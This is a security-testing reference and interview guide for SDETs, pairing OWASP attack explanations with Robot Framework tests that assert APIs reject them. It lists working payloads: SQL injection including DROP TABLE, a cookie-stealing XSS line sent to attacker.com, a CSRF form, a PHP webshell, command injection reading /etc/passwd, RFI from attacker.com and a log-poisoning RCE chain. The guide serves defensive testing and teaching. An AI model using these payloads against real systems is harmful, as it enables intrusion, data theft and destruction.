# Security Testing Reference Guide

**Framework:** Robot Framework | **Target:** Web & GraphQL APIs
**Context:** SDET with security testing as an add-on skill — covers OWASP Top 10 practically

---

## Table of Contents
1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [JWT / Token Security](#3-jwt--token-security)
4. [CSRF — Cross-Site Request Forgery](#4-csrf--cross-site-request-forgery)
5. [File Upload Vulnerability](#5-file-upload-vulnerability)
6. [Command Injection](#6-command-injection)
7. [File Inclusion (LFI / RFI)](#7-file-inclusion-lfi--rfi)
8. [OWASP Top 10 Coverage Map](#8-owasp-top-10-coverage-map)
9. [Interview Questions & Answers](#9-interview-questions--answers)

---

## 1. SQL Injection

### What is it?
User input is embedded directly into a SQL query without sanitization. The attacker manipulates
the query logic to bypass login, extract data, or destroy tables.

### How it works
App builds this query:
```sql
SELECT * FROM users WHERE id = '<USER_INPUT>'
```
Payload `1' OR '1'='1` turns it into:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'   -- always TRUE → returns all rows
```

### Attack Types & Payloads

| Type | Payload | Effect |
|------|---------|--------|
| **Tautology / Boolean** | `' OR '1'='1` | Always true — bypasses WHERE filter |
| **Admin bypass** | `admin' --` | `--` comments out the password check |
| **UNION extraction** | `' UNION SELECT null, email, password FROM users --` | Dumps another table |
| **Time-based blind** | `' OR IF(1=1, SLEEP(5), 0) --` | No visible output — delay confirms vulnerability |
| **DDL injection** | `'; DROP TABLE campaign; --` | Destroys a table |
| **Header injection** | `Referer: https://site.com/; OR '1'='1'` | SQLi via HTTP header instead of body |

### Vulnerable vs Secure Response
| | Response |
|---|---|
| **Vulnerable** | Returns all rows / database error exposed / response delayed 5s |
| **Secure** | 400 or generic "Invalid input" — no SQL error details leaked |

### Robot Framework Example
```robot
SQLi_Tautology_Is_Blocked
    ${resp}=    GET    ${BASE_URL}/search?id=1' OR '1'='1&Submit=Submit
    Should Be Equal As Integers    ${resp.status_code}    400
    Should Not Contain    ${resp.text}    email

SQLi_UNION_Extraction_Is_Blocked
    ${resp}=    GET    ${BASE_URL}/search?id=' UNION SELECT null,email,password FROM users --
    Should Not Contain    ${resp.text}    @           # no email addresses in response

SQLi_TimeBased_Does_Not_Sleep
    ${start}=    Get Time    epoch
    GET    ${BASE_URL}/search?id=' OR IF(1=1,SLEEP(5),0) --
    ${end}=    Get Time    epoch
    Should Be True    ${end} - ${start} < 4    Response took >4s — time-based SQLi may work
```

---

## 2. Cross-Site Scripting (XSS)

### What is it?
User input is reflected in the HTML response without encoding. The injected JavaScript
executes in the victim's browser — stealing cookies, redirecting, or defacing pages.

### Types

**Reflected XSS** — payload comes from the URL, executes immediately for that one request:
```
http://site.com/search?q=<script>alert(document.cookie)</script>
```

**Stored XSS** — payload is saved to the database, executes for every user who views it:
```
Comment field: <script>document.location='http://attacker.com?c='+document.cookie</script>
```

**DOM-based XSS** — client-side JS reads URL fragment and writes it to the DOM unsanitized:
```
http://site.com/#<img src=x onerror=alert(1)>
```

### Payloads

| Payload | What it bypasses |
|---------|-----------------|
| `<script>alert(1)</script>` | No filtering at all |
| `<img src=x onerror=alert(1)>` | Script tag filter — uses event handler |
| `"><script>alert(1)</script>` | Breaks out of an HTML attribute value |
| `<svg onload=alert(1)>` | Tags-based filter — SVG is overlooked |
| `&lt;script&gt;` entered in URL | Checks if app double-encodes (if so, it's safe) |

### Vulnerable vs Secure Response
| | Response |
|---|---|
| **Vulnerable** | `<script>alert(1)</script>` appears as-is in HTML → browser executes it |
| **Secure** | `&lt;script&gt;alert(1)&lt;/script&gt;` — HTML-encoded, renders as text |

### Robot Framework Example
```robot
XSS_Script_Tag_Is_Sanitized
    ${resp}=    GET    ${BASE_URL}/search?name=<script>alert(1)</script>
    Should Not Contain    ${resp.text}    <script>alert(1)</script>
    Should Contain    ${resp.text}    &lt;script&gt;    # must be encoded

XSS_ImgTag_Event_Is_Sanitized
    ${resp}=    GET    ${BASE_URL}/search?name=<img src=x onerror=alert(1)>
    Should Not Contain    ${resp.text}    onerror=alert
```

---

## 3. JWT / Token Security

### What is a JWT?
A JWT has 3 parts separated by dots:
```
eyJhbGciOiJIUzI1NiJ9   .   eyJ1c2VySWQiOjF9   .   SflKxwRJSMeKKF2QT4fwpMeJf
    HEADER (alg)                PAYLOAD (claims)         SIGNATURE
```
Server generates it at login. Client sends it as `Authorization: Bearer <token>` on every request.
Server MUST verify the signature before trusting any claim in the payload.

### Attack Types

| Attack | How | Vulnerable server behavior |
|--------|-----|---------------------------|
| **Expired token bypass** | Use token past its `exp` time | Accepts it without checking expiry |
| **alg:none attack** | Change `"alg":"HS256"` → `"alg":"none"`, remove signature | Skips signature check for unsigned tokens |
| **Payload tampering** | Decode payload, change `"userId":1` → `"userId":999`, re-encode — keep old signature | Doesn't verify signature matches payload |
| **Rogue issuer** | Change `"iss":"myapp"` → `"iss":"attacker.com"` | Doesn't validate issuer field |
| **Weak secret brute force** | Secret is `secret123` → cracked with hashcat in seconds | Weak HMAC secret |
| **Blank / null token** | Send `Bearer ` (empty) or just `Bearer` | Accepts empty auth header |
| **Missing Bearer prefix** | Send raw JWT without `Bearer ` scheme | Doesn't enforce scheme |
| **Extremely long token** | Send 50,000 char token | Crashes or returns 500 instead of 400 |

### alg:none Example
```
Original header:  {"alg":"HS256","typ":"JWT"}
Attack header:    {"alg":"none","typ":"JWT"}
Attack token:     eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjF9.
                  (no signature at the end — just a trailing dot)
```

### What every JWT test should verify

| Test | Expected |
|------|----------|
| Expired token | 401 Unauthorized |
| alg:none token | 401 Unauthorized |
| Tampered payload | 401 Unauthorized |
| Wrong issuer | 401 Unauthorized |
| Blank token | 401 Unauthorized |
| Missing Bearer prefix | 401 Unauthorized |
| 50k-char token | 400 or 401 — NOT 500 (no crash) |
| Valid token | 200 OK |
| JWT claims present | `iss`, `userId`, `exp`, `tokenType`, `mfaEnabled` |

### Robot Framework Example
```robot
Expired_Token_Is_Rejected
    ${resp}=    GET    ${BASE_URL}/user    headers=${EXPIRED_TOKEN_HEADER}
    Should Be Equal As Integers    ${resp.status_code}    401

Alg_None_Attack_Is_Rejected
    ${alg_none_token}=    Build Alg None Token    ${VALID_TOKEN}
    ${resp}=    GET    ${BASE_URL}/user    headers=Authorization: Bearer ${alg_none_token}
    Should Be Equal As Integers    ${resp.status_code}    401

Extremely_Long_Token_Does_Not_Crash_Server
    ${long_token}=    Evaluate    'A' * 50000
    ${resp}=    GET    ${BASE_URL}/user    headers=Authorization: Bearer ${long_token}
    Should Not Be Equal As Integers    ${resp.status_code}    500    Server crashed on long token
```

---

## 4. CSRF — Cross-Site Request Forgery

### What is it?
A browser automatically sends cookies with every request to a domain — even cross-origin requests.
An attacker embeds a hidden form on a malicious site that submits to the victim's trusted site.
Since the victim's browser sends their session cookie automatically, the server thinks it's legitimate.

### Attack Flow
```
1. Victim logs into bank.com → gets session cookie
2. Victim visits attacker.com (malicious page)
3. attacker.com has hidden auto-submitting form:

   <form action="https://bank.com/transfer" method="POST" id="f">
     <input name="to"     value="attacker_account">
     <input name="amount" value="10000">
   </form>
   <script>document.getElementById('f').submit();</script>

4. Browser sends POST to bank.com WITH victim's session cookie
5. Bank processes the transfer — victim loses money
```

### How to test

| Test case | What you send | Expected secure behavior |
|-----------|--------------|--------------------------|
| No CSRF token | POST without `X-CSRF-Token` header | 403 Forbidden |
| Wrong CSRF token | POST with `X-CSRF-Token: INVALID123` | 403 Forbidden |
| Valid CSRF token | POST with correct token | 200 OK |
| Malicious origin | `Origin: http://malicious-site.com` | 403 Forbidden |
| No Referer header | Remove `Referer` header from form POST | 403 or validation error |

### Robot Framework Example
```robot
CSRF_Request_Without_Token_Is_Rejected
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    POST    ${BASE_URL}/account/change-password
    ...    data=password_new=hacked&password_conf=hacked
    ...    cookies=${session}
    Should Be Equal As Integers    ${resp.status_code}    403

CSRF_Request_With_Wrong_Token_Is_Rejected
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    POST    ${BASE_URL}/account/change-password
    ...    data=password_new=hacked&password_conf=hacked&user_token=FAKE_TOKEN
    ...    cookies=${session}
    Should Be Equal As Integers    ${resp.status_code}    403
```

---

## 5. File Upload Vulnerability

### What is it?
If a server allows uploading arbitrary files and serves them from a web-accessible path,
an attacker can upload a script (e.g., PHP webshell) and then request it to execute OS commands.

### PHP Webshell — the simplest attack
Upload file `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```
Access at: `http://target.com/uploads/shell.php?cmd=id`
Result: Server executes `id` command and returns output → full RCE.

### Bypass Techniques

| Bypass | Technique | Example |
|--------|-----------|---------|
| **Extension blacklist bypass** | Double extension | `shell.php.jpg` — blacklist checks last extension, web server executes first |
| **MIME type bypass** | Forge Content-Type | Upload `shell.php` with `Content-Type: image/jpeg` |
| **Null byte bypass** | Append `%00` | `shell.php%00.jpg` — truncated at `%00`, saved as `shell.php` (old PHP) |
| **Case bypass** | Mixed case | `shell.PHP` or `shell.pHp` — bypasses case-sensitive blacklist |
| **Magic bytes bypass** | Add image header to PHP | First bytes `GIF89a` then `<?php system($_GET['cmd']); ?>` |

### What to test

| Test | Expected |
|------|----------|
| Upload `.php` file directly | Blocked — 400 or validation error |
| Upload `.php` with `Content-Type: image/jpeg` | Still blocked — server must check content, not just MIME |
| Upload `shell.php.jpg` | Blocked or stored but NOT executed as PHP |
| Access an uploaded non-executable file | Served as download, NOT executed |

### Robot Framework Example
```robot
PHP_Webshell_Upload_Is_Blocked
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${file}=    Create PHP Webshell File
    ${resp}=    Upload File    ${BASE_URL}/upload    ${file}    cookies=${session}
    Should Not Be Equal As Integers    ${resp.status_code}    200
    Should Contain Any    ${resp.text}    not allowed    invalid    rejected

Double_Extension_Shell_Is_Not_Executed
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    Upload File    ${BASE_URL}/upload    shell.php.jpg    cookies=${session}
    # Even if upload succeeds, file must not execute as PHP
    ${exec_resp}=    GET    ${BASE_URL}/hackable/uploads/shell.php.jpg?cmd=id
    Should Not Contain    ${exec_resp.text}    uid=    # no command output
```

---

## 6. Command Injection

### What is it?
The application passes user input to an OS shell command. An attacker appends extra commands
using shell metacharacters (`;`, `|`, `&&`, `||`, backticks).

### Attack Payloads

| Payload | Operator | Behavior |
|---------|----------|---------|
| `127.0.0.1; ls -la` | `;` | Runs BOTH commands regardless of success |
| `127.0.0.1 && cat /etc/passwd` | `&&` | Runs second only if first succeeds |
| `127.0.0.1 \| whoami` | `\|` | Pipes output of first into second |
| `127.0.0.1 \|\| id` | `\|\|` | Runs second only if first FAILS |
| `` 127.0.0.1 `id` `` | backtick | Command substitution |
| `127.0.0.1; sleep 5` | time-based | Confirms injection without visible output |

### Example — Ping utility vulnerability
App code (vulnerable):
```python
os.system("ping -c 1 " + user_input)      # NEVER do this
```
Payload: `127.0.0.1; cat /etc/passwd`
Executes: `ping -c 1 127.0.0.1` then `cat /etc/passwd` → returns contents.

Secure fix:
```python
subprocess.run(["ping", "-c", "1", user_ip], shell=False)  # list form, no shell
```

### Robot Framework Example
```robot
Command_Injection_Semicolon_Is_Blocked
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    POST    ${BASE_URL}/exec    data=ip=127.0.0.1; cat /etc/passwd    cookies=${session}
    Should Not Contain    ${resp.text}    root:x:0:0    # /etc/passwd content not leaked

Command_Injection_Pipe_Is_Blocked
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    POST    ${BASE_URL}/exec    data=ip=127.0.0.1 | whoami    cookies=${session}
    Should Not Contain    ${resp.text}    www-data
    Should Not Contain    ${resp.text}    root
```

---

## 7. File Inclusion (LFI / RFI)

### What is it?
The application uses user input to select which file to include/load, without sanitizing path traversal.

### LFI — Local File Inclusion
Reads files already on the server:
```
http://site.com/page?file=../../../../etc/passwd
```
App code (vulnerable):
```php
include($_GET['file']);           // directly includes user-supplied path
```

### RFI — Remote File Inclusion
Loads and executes a script from an attacker's server:
```
http://site.com/page?file=http://attacker.com/shell.txt
```
Requires `allow_url_include=On` in PHP — disabled by default in modern PHP.

### LFI Payloads

| Payload | Target file |
|---------|-------------|
| `../../../../etc/passwd` | Linux user list (confirms LFI) |
| `../../../../etc/shadow` | Hashed passwords (requires root) |
| `../../../../windows/win.ini` | Windows config |
| `..%2F..%2F..%2Fetc%2Fpasswd` | URL-encoded `/` to bypass basic filter |
| `....//....//....//etc/passwd` | Double-slash bypass (filter strips `../` once) |
| `../../../../proc/self/environ` | Environment vars — may contain secrets or paths |
| `../../../../var/log/apache2/access.log` | Log poisoning → RCE chain |

### Null byte (PHP < 5.3.4 only)
```
?page=../../../../etc/passwd%00.php
```
`%00` terminates the string — the `.php` suffix the app appends is ignored.

### Robot Framework Example
```robot
LFI_Path_Traversal_Is_Blocked
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    GET    ${BASE_URL}/vulnerabilities/fi/?page=../../../../etc/passwd
    ...    cookies=${session}
    Should Not Contain    ${resp.text}    root:x:0:0    # passwd file content not returned

LFI_URL_Encoded_Traversal_Is_Blocked
    ${session}=    Authenticate And Get Session    ${USERNAME}    ${PASSWORD}
    ${resp}=    GET    ${BASE_URL}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd
    ...    cookies=${session}
    Should Not Contain    ${resp.text}    root:x:0:0
```

---

## 8. OWASP Top 10 Coverage Map

| OWASP A0# | Category | Vulnerabilities Covered |
|-----------|----------|------------------------|
| **A01** | Broken Access Control | IDOR (cross-advertiser access), Privilege Escalation |
| **A02** | Cryptographic Failures | Weak JWT secret, sensitive data in logs |
| **A03** | Injection | SQL Injection, Command Injection, LDAP Injection, XXE, Header Injection |
| **A04** | Insecure Design | Missing rate limiting, no CSRF protection, GraphQL depth attacks |
| **A05** | Security Misconfiguration | CORS misconfiguration, GraphQL introspection exposed in prod |
| **A06** | Vulnerable & Outdated Components | ReDoS (catastrophic regex backtracking) |
| **A07** | Authentication Failures | JWT alg:none, expired token bypass, weak tokens |
| **A08** | Software & Data Integrity Failures | CSRF, JWT payload tampering |
| **A09** | Security Logging & Monitoring Failures | PII / tokens exposed in logs |
| **A10** | SSRF / Input Validation | Path Traversal (LFI), RFI, Null byte injection |

---

## 9. Interview Questions & Answers

> **Level:** SDET with security testing as an add-on skill.
> These are not OSCP/WAPT level — they're for someone who has done security automation testing.

---

### SQL Injection

**Q: What is the difference between UNION-based and time-based blind SQL injection?**

A: UNION-based appends a `SELECT` to the original query and data is returned directly in
the response — you can see extracted data. Time-based blind is used when there's no visible
output; you inject `SLEEP(5)` inside a condition and measure the response delay — if it sleeps,
the condition was true. Time-based is slower but works on any endpoint.

---

**Q: How do parameterized queries prevent SQL injection?**

A: A parameterized query separates SQL code from data. The driver sends the query structure
and data separately to the database — user input is NEVER interpreted as SQL, only as a value.
Example: `SELECT * FROM users WHERE id = ?` with `1' OR '1'='1` as the parameter just looks for
a literal user with that exact string as their ID — it doesn't alter the query logic.

---

**Q: What is a tautology attack?**

A: Injecting a condition that always evaluates to true — e.g., `OR '1'='1'` or `AND 1=1`.
This makes the WHERE clause always return all rows, bypassing filters or login checks.

---

### XSS

**Q: What is the difference between reflected and stored XSS? Which is more dangerous?**

A: Reflected XSS comes from the current HTTP request and only affects the person who clicks
the malicious link. Stored XSS is saved to the database and executes for EVERY user who views
that page — more dangerous because it doesn't require a victim to click a special link.

---

**Q: How do you prevent XSS?**

A: (1) HTML-encode output — convert `<` to `&lt;`, `>` to `&gt;`, etc.
(2) Use frameworks that auto-escape output (React, Vue, Jinja2 with `autoescape=True`).
(3) Set `Content-Security-Policy` headers to restrict which scripts can execute.
(4) Never put user input inside `<script>` blocks or event handlers even if encoded.

---

**Q: Can XSS happen in a JSON API?**

A: Not directly — browsers don't execute JSON as HTML. But if an API response is later
reflected in a webpage without encoding (e.g., the frontend does `innerHTML = api.data`),
stored XSS is possible. Setting the correct `Content-Type: application/json` header reduces risk.

---

### JWT

**Q: What is an alg:none attack?**

A: The JWT spec allows `"alg":"none"` to indicate an unsigned token. An attacker takes a
valid JWT, changes the header's alg to `none`, removes the signature, and resubmits it.
A vulnerable server that doesn't explicitly reject the `none` algorithm will skip signature
verification and accept any payload — allowing full identity spoofing.

---

**Q: What claims should every JWT validate server-side?**

A: `exp` (not expired), `iss` (trusted issuer), `iat` (issued at — not too old), and
application-specific claims like `userId` and `tokenType`. Validating `aud` (audience)
is also important in multi-service architectures to prevent token reuse across services.

---

**Q: Why can't you revoke a JWT before its expiry?**

A: JWTs are stateless — the server doesn't store them. Once issued, there's no built-in
way to invalidate a specific token. Solutions include: short expiry + refresh tokens,
a token blocklist (defeats statelessness), or versioned user secrets (rotating the signing
secret invalidates all tokens for that user).

---

### CSRF

**Q: What's the difference between CSRF and XSS?**

A: XSS injects malicious code that RUNS inside the victim's browser on the target site —
it exploits trust the browser has in the site. CSRF tricks the victim's browser into
SENDING a request to the target site — it exploits trust the site has in the browser's cookies.
XSS needs a vulnerability on the target site; CSRF only needs a logged-in victim.

---

**Q: Does HTTPS protect against CSRF?**

A: No. HTTPS encrypts the transport but doesn't stop a cross-origin form from submitting.
The browser still sends the session cookie. Protection comes from CSRF tokens (unpredictable
values the server validates), `SameSite=Strict` cookie attribute, or checking `Origin`/`Referer` headers.

---

### File Upload

**Q: How would you secure a file upload endpoint?**

A: (1) Whitelist allowed extensions (`.jpg`, `.png`, `.pdf` only — no `.php`, `.jsp`).
(2) Validate file content server-side — check magic bytes, not just the extension or MIME header.
(3) Rename uploaded files to random UUIDs — prevents direct access by guessing filename.
(4) Store uploads outside the webroot or on a CDN — so they can never be executed by the web server.
(5) Scan with antivirus. (6) Set strict `Content-Security-Policy` and serve with `Content-Disposition: attachment`.

---

**Q: What is a webshell?**

A: A script uploaded to a server that gives the attacker an interactive command interface
through the browser. Simplest PHP example: `<?php system($_GET['cmd']); ?>`.
Once uploaded, accessing `/uploads/shell.php?cmd=id` executes `id` on the server — the attacker
now has Remote Code Execution with the web server's OS permissions.

---

### Command Injection

**Q: What is the difference between command injection and code injection?**

A: Command injection injects OS shell commands — the app calls `system()` or `exec()` with
unsanitized input, and the attacker appends `;`, `|`, `&&` to run their own OS commands.
Code injection injects code in the app's OWN language — e.g., exploiting `eval()` in PHP/Python
to execute arbitrary application code. Both are critical but command injection directly controls the OS.

---

**Q: Why is `shell=True` dangerous in Python's subprocess?**

A: `subprocess.run("ping " + user_input, shell=True)` passes the full string to `/bin/sh -c`.
This means shell metacharacters in `user_input` (`;`, `|`, `` ` ``) are interpreted by the shell.
Using `subprocess.run(["ping", "-c", "1", user_input], shell=False)` passes arguments as a list —
the OS never invokes a shell, so metacharacters are treated as literal data.

---

### File Inclusion

**Q: What is the difference between LFI and RFI?**

A: LFI (Local File Inclusion) reads files already on the server — e.g., `/etc/passwd`,
config files, or log files. It can lead to RCE via log poisoning. RFI (Remote File Inclusion)
loads and executes a script from the attacker's external server — immediate RCE if it works.
RFI requires `allow_url_include=On` in PHP (disabled by default in modern PHP).

---

**Q: How can LFI escalate to Remote Code Execution?**

A: Via log poisoning: (1) Send a request with PHP code in the `User-Agent` header —
it gets written to the Apache access log. (2) Use LFI to include
`/var/log/apache2/access.log` — the PHP in the log now executes. Also possible via
`/proc/self/environ` if it's readable and writable by the web process.
